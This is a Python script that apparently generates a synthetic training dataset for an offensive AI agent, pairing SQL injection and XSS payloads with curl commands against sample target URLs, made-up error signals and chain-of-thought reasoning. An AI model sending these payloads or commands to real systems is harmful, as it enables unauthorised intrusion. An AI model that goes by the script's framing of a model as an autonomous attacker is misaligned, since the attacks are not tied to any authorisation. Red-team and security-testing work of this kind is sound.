import json
import random
import os

# ============================================================================
# CONFIGURATION & IMPROVED PAYLOAD LIBRARY
# ============================================================================

VULN_CLASSES = ["sql_injection", "xss"]

# Mapping parameter roles to vulnerability types for realism
PARAM_MAP = {
    "sql_injection": ["id", "user_id", "uid", "product_id", "category", "username", "token"],
    "xss": ["q", "s", "search", "query", "term", "comment", "review", "name", "feedback"]
}

PAYLOAD_LIBRARY = {
    "sql_injection": {
        "none": ["' OR '1'='1", "admin' --", "' OR 1=1#", "' UNION SELECT 1,2,3--"],
        "basic": ["' OR 1=1/*", "') OR ('1'='1", "admin'/**/--", "' UNION ALL SELECT NULL,NULL,@@version--"]
    },
    "xss": {
        "none": ["<script>alert('HackOps')</script>", "<script>confirm(1)</script>"],
        "basic": [
            "<img src=x onerror=alert('HackOps')>", 
            "<svg/onload=alert(1)>", 
            "javascript:alert(1)", 
            "\"><script>alert(1)</script>"
        ]
    }
}

HOSTS = ["hackops.corp.internal", "shop.acme.io", "api.sec-prod.net", "billing.gateway.com", "myportal.net"]
BACKENDS = ["MySQL", "PostgreSQL", "MSSQL", "MariaDB", "SQLite"]

# ============================================================================
# IMPROVED DATA GENERATION LOGIC
# ============================================================================

def get_observable_context(vuln_class, param, backend, method):
    """Generates realistic signals with strict method alignment."""
    context = {
        "form_html": f"<form method='{method}' action=''><input name='{param}'><button>Submit</button></form>",
        "server_headers": {
            "Server": f"Apache/2.4.{random.randint(10,50)}",
            "X-Powered-By": f"PHP/7.4.{random.randint(1,10)}"
        }
    }
    
    if vuln_class == "sql_injection":
        errors = {
            "MySQL": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
            "PostgreSQL": 'ERROR: syntax error at or near "\'"',
            "MSSQL": "Unclosed quotation mark after the character string",
            "MariaDB": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version",
            "SQLite": "SQL error: incomplete input"
        }
        context["error_on_single_quote"] = errors.get(backend, "Internal Server Error")
        context["fuzz_signal"] = "SQL_ERROR_DETECTED"
    elif vuln_class == "xss":
        context["reflection_test"] = f"Detected raw reflection of probe string in response body."
        context["fuzz_signal"] = "REFL_DETECTED"
    elif vuln_class == "lfi":
        context["fuzz_signal"] = "PATH_TRAVERSAL_DETECTED"
    elif vuln_class == "rce":
        context["fuzz_signal"] = "SHELL_REWARD_DETECTED"
        
    return context

def generate_reasoning(vuln_class, param, evasion, context):
    """Generates precise Chain-of-Thought based on specific evidence."""
    if vuln_class == "sql_injection":
        return (f"The target URL returned a backend syntax error when a single quote was injected into parameter '{param}'. "
                f"Evasion level '{evasion}' is requested; I will use a corresponding payload.")
    elif vuln_class == "xss":
        return (f"The input provided to '{param}' was reflected directly in the HTML. "
                f"Using an {('event handler' if evasion != 'none' else 'standard script tag')} to confirm execution.")
    return f"Analyzing target for {vuln_class} vulnerability on parameter '{param}'."

def generate_payload_command(vuln_class, url, param, evasion, method):
    """Builds a realistic command with method/parameter alignment."""
    payload = random.choice(PAYLOAD_LIBRARY[vuln_class][evasion])
    
    if method == "POST":
        cmd = f"curl -s -X POST '{url}' -d '{param}={payload}'"
    else:
        # For GET, we attach to URL
        cmd = f"curl -s '{url}?{param}={payload}'"
        
    return {
        "tool": "curl",
        "command": cmd,
        "raw_payload": payload,
        "encoding": "none", # Augmentation script handles encoding
        "attack_class": f"{vuln_class}_exploit",
        "confidence": round(random.uniform(0.9, 0.99), 2)
    }

def generate_dataset(num_examples=1200):
    dataset = []
    for _ in range(num_examples):
        vuln_class = random.choice(VULN_CLASSES)
        evasion = random.choice(["none", "basic"])
        method = random.choice(["GET", "POST"])
        backend = random.choice(BACKENDS)
        param = random.choice(PARAM_MAP[vuln_class]) # AI-aligned parameters
        url = f"http://{random.choice(HOSTS)}/{vuln_class}/{random.randint(100,999)}"
        
        obs_context = get_observable_context(vuln_class, param, backend, method)
        reasoning = generate_reasoning(vuln_class, param, evasion, obs_context)
        response = generate_payload_command(vuln_class, url, param, evasion, method)
        
        entry = {
            "instruction": f"Generate a {vuln_class.replace('_', ' ')} exploit payload.",
            "context": {
                "strategic_objective": f"EXPLOIT_{vuln_class.upper()}",
                "target_url": url,
                "target_parameter": param,
                "http_method": method,
                "observable_context": obs_context,
                "evasion_level": evasion,
                "backend_hint": backend if vuln_class == "sql_injection" else "N/A"
            },
            "reasoning": reasoning,
            "response": response
        }
        dataset.append(entry)
    return dataset

if __name__ == "__main__":
    output_path = "api/data/red_actioner_dataset.jsonl"
    os.makedirs("api/data", exist_ok=True)
    data = generate_dataset(1200)
    with open(output_path, "w") as f:
        for entry in data:
            f.write(json.dumps(entry) + "\n")
    print(f"Generated {len(data)} high-quality samples in {output_path}")
